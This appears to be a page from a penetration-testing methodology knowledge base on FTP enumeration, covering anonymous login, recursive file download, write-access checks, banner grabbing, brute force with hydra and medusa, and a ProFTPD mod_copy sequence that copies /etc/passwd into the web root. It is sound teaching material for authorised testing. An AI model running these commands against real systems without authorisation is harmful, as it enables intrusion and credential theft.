---
id: ftp-enum
title: FTP Enumeration
stage: enumeration
tags: [windows, linux, ftp]
summary: Check for anonymous access, enumerate files, and identify version-specific exploits on FTP services.
leads_to:
  - public-exploit
  - file-upload-shell
  - ssh-access
  - linux-cred-hunting
---

## Prerequisites

Port 21 open. No credentials required for anonymous login checks.

FTP often exposes sensitive files via anonymous access or reveals its version in the banner — both vsftpd 2.3.4 and ProFTPD with mod_copy have critical RCE exploits. If the FTP root overlaps with the web root, write access becomes a web shell upload straight to RCE.

## Quick Win

> Anonymous login — the most common misconfiguration, requires zero credentials.

```bash
ftp $TARGET
# username: anonymous
# password: anonymous (or blank)
```

## Enumerate Files

> Recursive download of all accessible content — look for configs, credentials, and backups.

```bash
# FTP client (interactive)
ftp $TARGET
> ls -la
> get file.txt

# Wget (non-interactive, full recursive download)
wget -r --no-passive ftp://anonymous:@$TARGET/
lftp -e "set ftp:ssl-allow no; ls; exit" $TARGET
```

## Check for Write Access

> Write access to FTP root + web root overlap = web shell upload.

```bash
ftp $TARGET
> put test.txt   # if this succeeds, check if path is under web root
```

## Version-Based Exploits

> Banner grab gives you the version — searchsploit immediately.

```bash
nc -nv $TARGET 21
# Look for: vsftpd 2.3.4 (backdoor), ProFTPD 1.3.3c (mod_copy RCE)

# ProFTPD mod_copy — copy files to web root without auth
nc -nv $TARGET 21
> SITE CPFR /etc/passwd
> SITE CPTO /var/www/html/passwd.txt
```

## Brute Force (if no anonymous access)

> Try common credentials before full wordlist brute — faster and avoids lockout.

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$TARGET
medusa -h $TARGET -U users.txt -P passwords.txt -M ftp
```

## Leads To

Anonymous read-only → look for stored credentials and configs → public-exploit or password-spray. Anonymous write + web root overlap → file-upload-shell → rev-shell. Version match on vsftpd/ProFTPD → public-exploit → immediate shell.
